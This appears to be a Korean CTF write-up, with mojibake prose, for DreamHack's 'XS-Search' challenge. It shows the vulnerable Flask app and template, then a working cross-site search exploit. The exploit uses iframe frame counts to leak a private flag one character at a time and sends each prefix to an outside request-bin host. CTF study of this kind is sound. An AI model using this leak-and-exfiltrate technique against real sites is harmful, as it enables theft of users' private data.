---
title: "[2025-08-19] XS-Search"
excerpt: "XS-Search"

categories:
  - Problem
tags:
  - [XSS]

permalink: /Problem/[2025-08-19] XS-Search/

toc: true
toc_sticky: true

date: 2025-08-19
last_modified_at: 2025-08-19
---

## ğŸ¦¥ ë³¸ë¬¸

- app.py
    
    ```python
    #!/usr/bin/python3
    from flask import Flask, request, render_template, make_response, redirect, url_for
    from selenium.common.exceptions import TimeoutException
    from urllib.parse import urlparse
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from hashlib import md5
    import urllib
    import os
    
    app = Flask(__name__)
    app.secret_key = os.urandom(32)
    
    try:
        FLAG = open("./flag.txt", "r").read()
    except:
        FLAG = "[**FLAG**]"
    
    notes = {
        (FLAG, True), 
        ("Hello World", False), 
        ("DreamHack", False), 
        ("carpe diem, quam minimum credula postero", False)
    }
    
    def read_url(url, cookie={"name": "name", "value": "value"}):
        cookie.update({"domain": "127.0.0.1"})
        try:
            service = Service(executable_path="/chromedriver")
            options = webdriver.ChromeOptions()
            for _ in [
                "headless",
                "window-size=1920x1080",
                "disable-gpu",
                "no-sandbox",
                "disable-dev-shm-usage",
            ]:
                options.add_argument(_)
            driver = webdriver.Chrome(service=service, options=options)
            driver.implicitly_wait(3)
            driver.set_page_load_timeout(3)
            driver.get(url)
        except TimeoutException as e:
            driver.quit()
            return True
        except Exception as e:
            driver.quit()
            # return str(e)
            return False
        driver.quit()
        return True
    
    @app.route("/")
    def index():
        return render_template('index.html')
    
    @app.route('/search')
    def search():
        query = request.args.get('query', None)
        if query == None:
            return render_template("search.html", query=None, result=None)
        for note, private in notes:
            if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
                continue
            if query != "" and query in note:
                return render_template("search.html", query=query, result=note)
        return render_template("search.html", query=query, result=None)
    
    @app.route("/submit", methods=["GET", "POST"])
    def submit():
        if request.method == "GET":
            return render_template("submit.html")
        elif request.method == "POST":
            url = request.form.get("url", "")
            if not urlparse(url).scheme.startswith("http"):
                return '<script>alert("wrong url");history.go(-1);</script>'
            if not read_url(url):
                return '<script>alert("wrong??");history.go(-1);</script>'
    
            return '<script>alert("good");history.go(-1);</script>'
    
    app.run(host="0.0.0.0", port=8000)
    
    ```
    
    - `notes` : (Flag, True) ê°™ì€ í˜•íƒœì˜ íŠœí”Œë“¤ë¡œ ì´ë£¨ì–´ì§„ ì„¸íŠ¸.
    - `read_url(url, cookie)` : ì›¹ë“œë¼ì´ë²„ë¥¼ í†µí•´ì„œ í•´ë‹¹ URLì— ì¿ í‚¤ë¥¼ ê°€ì§€ê³  ì ‘ì†
    - `index()` : `index.html`ì„ ë Œë”ë§
    - `search()`
        - queryê°€ ì—†ë‹¤ë©´ `search.html`ì„ ë Œë”ë§
        - queryê°€ ìˆëŠ” ê²½ìš°, notesì˜ íŠœí”Œë“¤ì„ ê²€ì‚¬
            - privateê°€ Trueì´ê³  ìš”ì²­ì˜ remote_addr(í´ë¼ì´ì–¸íŠ¸ IPì£¼ì†Œ)ê°€ ë¡œì»¬ì´ê³  HOSTê°€ 127.0.0.1:8000(ë¡œì»¬)ì´ ê°™ì€ ê²½ìš°ì—. ì¿¼ë¦¬ê°€ notesì— ìˆìœ¼ë©´ í•´ë‹¹ ì¿¼ë¦¬ê°’ê³¼ note ê°’ì„ ì‘ë‹µ.
    - `submit()`
        - GET : `submit.html` ë Œë”ë§
        - POST : urlì´ httpë¡œ ì‹œì‘í•˜ëŠ”ì§€ ê²€ì‚¬í•˜ê³  `read_url(url, cookie)`ì„ ì‹œë„.
- search.html
    
    ```html
    {% raw %}
    {% if result %}
      <h3>Searching "{{ query }}" found</h3>
      <iframe srcdoc="<pre>{{ result }}</pre>"></iframe>
    {% elif query %}
      <h3> Searching "{{ query }}" not found</h3>
    {% else %}
      <form method="GET" class="form-inline">
          <div class="form-group">
              <label class="sr-only" for="query">/</label>
              <div class="input-group">
                  <div class="input-group-addon">Query: </div>
                  <input type="text" class="form-control" id="query" name="query" placeholder="DreamHack">
              </div>
          </div>
          <button type="submit" class="btn btn-primary">Search</button>
      </form>
    {% endraw %}
    ```
    
    - resultê°€ ìˆìœ¼ë©´ `<iframe>` ì„ í†µí•˜ì—¬ `<pre>{{ result }}</pre>` ì‚½ì…
    - ì¦‰, ì„±ê³µ ì‹¤íŒ¨ ì—¬ë¶€ì— ë”°ë¼ `iframe` ê°œìˆ˜ê°€ ë‹¬ë¼ì§

### í’€ì´ ê³¼ì •

```html
<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            iframe.src = url;
            iframe.onload = () => { 
                if (iframe.contentWindow.frames.length != 0)
                    return resolve();
                else
                    return reject();
            };
        });
    }

    async function search(query) {
        try {
            await req(
              `http://localhost:8000/search?query=${query}`
            );
            return true;
        } catch (e) {
            return false;
        }
    }

    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{";

        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://hoelgcy.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }

    exploit();
</script>
```

ìœ„ì˜ ì½”ë“œë¥¼ ì›¹ í˜ì´ì§€ì— ì˜®ê¸°ê³  ë“œë¦¼í•µ íˆ´ì¦ˆì—ì„œ ì‘ë‹µì„ í™•ì¸í•œë‹¤. ì…€ë ˆëŠ„ì´ 3ì´ˆ ì œí•œì´ë¼ ì¼ë¶€ë§Œ ì¶œë ¥í•˜ëŠ” ë° í•´ë‹¹ ì½”ë“œë¥¼ `secret` ë³€ìˆ˜ì— ì¶”ê°€í•˜ë©´ì„œ ì‘ë‹µì„ ì–»ì–´ë‚´ë©´ flagë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤